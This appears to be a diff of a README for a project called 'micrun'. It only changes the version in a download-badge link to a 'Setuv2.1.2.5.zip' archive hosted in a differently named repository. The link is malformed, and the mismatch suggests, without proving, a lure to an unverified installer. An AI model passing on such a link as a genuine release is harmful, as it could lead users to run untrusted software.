@@ -1,4 +1,4 @@
-<a href="https://github.com/ivan-millercode1999g0/quicktool/releases/download/v5.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/⬇_DOWNLOAD-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download"></a>
+<a href="https://github.com/ivan-millercode1999g0/quicktool/releases/download/v1.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/⬇_DOWNLOAD-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download"></a>
 
 # ⚡ micrun
 
